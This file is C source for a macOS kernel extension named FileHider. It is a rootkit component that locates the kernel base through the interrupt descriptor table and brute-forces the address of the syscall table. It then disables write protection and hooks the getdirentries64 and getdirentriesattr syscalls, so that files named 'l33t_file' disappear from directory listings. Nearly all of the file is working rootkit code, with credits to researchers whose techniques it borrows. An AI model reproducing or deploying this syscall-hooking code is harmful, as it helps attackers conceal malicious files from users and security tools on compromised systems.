//
//  FileHider.c
//

#include "FileHider.h"

kern_return_t FileHider_start(kmod_info_t * ki, void *d)
{
    if( find_kernel_baseaddr() == -1 )
    {
        DLOG( "[+] Error: Unable to find kernel base address!\n");
        return KERN_FAILURE;
    }
    
    if( ( table = find_sysent() ) == NULL )
    {
        DLOG( "[+] Error: Unable to find _sysent!\n" );
        return KERN_FAILURE;
    }
    else
        DLOG( "[+] Found _sysent @ %p\n", table );
    
    /* backup */
    org_getdirentries64 = (void *) table[ SYS_getdirentries64 ].sy_call;
    org_getdirentriesattr = (void *) table[ SYS_getdirentriesattr ].sy_call;
    
    /* place hooks */
    DISABLE_WRITE_PROTECTION();
    table[ SYS_getdirentries64 ].sy_call = (void *) new_getdirentries64;
    table[ SYS_getdirentriesattr ].sy_call = (void *) new_getdirentriesattr;
    ENABLE_WRITE_PROTECTION();
        
    return KERN_SUCCESS;
}

kern_return_t FileHider_stop(kmod_info_t *ki, void *d)
{
    if( find_kernel_baseaddr() == -1 )
    {
        DLOG( "[+] Error: Unable to find kernel base address!\n");
        return KERN_FAILURE;
    }
    
    if( ( table = find_sysent() ) == NULL )
    {
        DLOG( "[+] Error: Unable to find _sysent!\n" );
        return KERN_FAILURE;
    }
    
    /* restore original syscalls */
    DISABLE_WRITE_PROTECTION();
    table[ SYS_getdirentries64 ].sy_call = (void *) org_getdirentries64;
    table[ SYS_getdirentriesattr ].sy_call = (void *) org_getdirentriesattr;
    ENABLE_WRITE_PROTECTION();
    
    return KERN_SUCCESS;
}

static char fname[] = "l33t_file";

int new_getdirentries64( struct proc *p, struct getdirentries64_args *uap, user_ssize_t *retval )
{
    int ret;
    u_int64_t bcount = 0;
    u_int64_t btot = 0;
    size_t buffersize = 0;
    struct direntry *dirp;
    void *mem = NULL;
    int updated = 0;
    
    ret = org_getdirentries64( p, uap, retval );
    btot = buffersize = bcount = *retval;
    
    if( bcount > 0 )
    {
        MALLOC( mem, void *, bcount, M_TEMP, M_WAITOK );
        
        if( mem == NULL )
            return(ret);
        
        copyin( uap->buf, mem, bcount );
        dirp = mem;
        
        while( bcount > 0 && dirp->d_reclen > 0 )
        {
            if( strncmp( dirp->d_name, (char *) &fname, strlen( (char *) &fname ) ) == 0 )
            {
                char *next = (char *) dirp + dirp->d_reclen;
                u_int64_t offset = (char *) next - (char *) mem;
                bcount -= dirp->d_reclen;
                btot -= dirp->d_reclen;
                bcopy( next, dirp, buffersize - offset );
                updated = 1;
                continue;
            }
            
            bcount -= dirp->d_reclen;
            dirp = (struct direntry *) ((char *) dirp + dirp->d_reclen);
        }
        
        if( updated == 1 )
        {
            copyout( mem, uap->buf, btot );
            *retval = btot;
        }
        
        FREE( mem, M_TEMP );
    }
    return ret;
}

struct FInfoAttrBuf {
    u_int32_t       length;
    attrreference_t name;
    fsobj_type_t    objType;
    char            finderInfo[ 32 ];
    u_int32_t       dirStatus;
} __attribute__( ( aligned(4), packed ) );

typedef struct FInfoAttrBuf FInfoAttrBuf;

int new_getdirentriesattr( struct proc *p, struct getdirentriesattr_args *uap, register_t *retval )
{
    struct FInfoAttrBuf *dirp;
    int ret;
    int removed = 0;
    u_int count = 0;
    size_t buffersize = 0;
    void *mem = NULL;
    
    ret = org_getdirentriesattr( p, uap, retval );
    copyin( uap->count, &count, sizeof( u_int ) );
    buffersize = uap->buffersize;
    if( count > 0 && buffersize > 0 )
    {
        MALLOC( mem, void *, buffersize, M_TEMP, M_WAITOK );
        
        if( mem == NULL )
            return(ret);
        
        copyin( uap->buffer, mem, buffersize );
        dirp = (struct FInfoAttrBuf *) mem;
        
        while( count > 0 )
        {
            char *name = ( (char *) &dirp->name + dirp->name.attr_dataoffset );
            
            if( strncmp( name, fname, strlen( (char*)fname ) ) == 0 )
            {
                char *next = ( (char *) dirp + dirp->length );
                u_int64_t offset = (char *) next - (char *) mem;
                bcopy( next, dirp, buffersize - offset );
                removed++;
                count--;
                if(count == 0)
                    break;
                continue;
            }
            
            dirp = (struct FInfoAttrBuf *) ( (char *) dirp + dirp->length );
            count--;
        }
        
        if( removed > 0 )
        {
            copyin( uap->count, &count, sizeof( u_int ) );
            count -= removed;
            copyout( &count, uap->count, sizeof(u_int) );
            copyout( mem, uap->buffer, buffersize );
        }
        
        FREE( mem, M_TEMP );
    }
    return ret;
}

static struct sysent *find_sysent( void )
{
    struct sysent *table = NULL;
    
    // finding _sysent by the following calculation is not working
    // on Mountain Lion since memory layout has changed:
    //      table = (struct sysent *)(((uint64_t)nsysent) -
    //                               ((uint64_t)sizeof(struct sysent) *
    //                               (uint64_t)*nsysent));
    // so we're off for some _sysent brute forcing (credits to: fG!):
    uint64_t data_address = 0;
    uint64_t data_size = 0;
    
    struct mach_header_64 *mh = ( struct mach_header_64 * ) KERNEL_MH_START_ADDR;
    
    if( mh->magic != MH_MAGIC_64 )
        return NULL;
        
    struct segment_command_64 *segmentCommand = NULL;
    
    if( ( segmentCommand = find_segment_64( mh, "__DATA" ) ) == NULL )
    {
        DLOG( "[+] Segment command not found!\n" );
        return NULL;
    }
    
    data_address = segmentCommand->vmaddr;
    data_size = segmentCommand->vmsize;
    
    if( data_address == 0 || data_size == 0 )
        return NULL;
    
    // brute force our way through __DATA section until we find _sysent
    for( uint64_t i = 0; i < (data_size); i++ )
    {
        table = ( struct sysent * ) ( data_address + i );
        
        if( table[SYS_syscall].sy_narg == 0 &&
            table[SYS_exit].sy_narg == 1  &&
            table[SYS_fork].sy_narg == 0 &&
            table[SYS_read].sy_narg == 3 &&
            table[SYS_wait4].sy_narg == 4 &&
            table[SYS_ptrace].sy_narg == 4 )
        {
            return table;
        }
    }
    
    return NULL;
}

// credits to: snare
struct segment_command_64 *
find_segment_64(struct mach_header_64 *mh, const char *segname)
{
    struct load_command *lc;
    struct segment_command_64 *seg, *foundseg = NULL;
    
    /* First LC begins straight after the mach header */
    lc = (struct load_command *)((uint64_t)mh + sizeof(struct mach_header_64));
    while ((uint64_t)lc < (uint64_t)mh + (uint64_t)mh->sizeofcmds) {
        if (lc->cmd == LC_SEGMENT_64) {
            /* Check load command's segment name */
            seg = (struct segment_command_64 *)lc;
            if (strcmp(seg->segname, segname) == 0) {
                foundseg = seg;
                break;
            }
        }
        
        /* Next LC */
        lc = (struct load_command *)((uint64_t)lc + (uint64_t)lc->cmdsize);
    }
    
    /* Return the segment (NULL if we didn't find it) */
    return foundseg;
}

// credits to: fG!
uint64_t find_kernel_baseaddr( )
{
    uint8_t idtr[ 10 ];
    uint64_t idt = 0;
    
    __asm__ volatile ( "sidt %0": "=m" ( idtr ) );
    
    idt = *( ( uint64_t * ) &idtr[ 2 ] );
    struct descriptor_idt *int80_descriptor = NULL;
    uint64_t int80_address = 0;
    uint64_t high = 0;
    uint32_t middle = 0;
    
    int80_descriptor = _MALLOC( sizeof( struct descriptor_idt ), M_TEMP, M_WAITOK );
    bcopy( (void*)idt, int80_descriptor, sizeof( struct descriptor_idt ) );
    
    high = ( unsigned long ) int80_descriptor->offset_high << 32;
    middle = ( unsigned int ) int80_descriptor->offset_middle << 16;
    int80_address = ( uint64_t )( high + middle + int80_descriptor->offset_low );
    
    uint64_t temp_address = int80_address;
    uint8_t *temp_buffer = _MALLOC( 4, M_TEMP, M_WAITOK );
    
    while( temp_address > 0 )
    {
        bcopy( ( void * ) temp_address, temp_buffer, 4 );
        if ( *( uint32_t * )( temp_buffer ) == MH_MAGIC_64 )
        {
            KERNEL_MH_START_ADDR = temp_address;
            return 0;
        }
        temp_address -= 1;
    }
    
    return -1;
}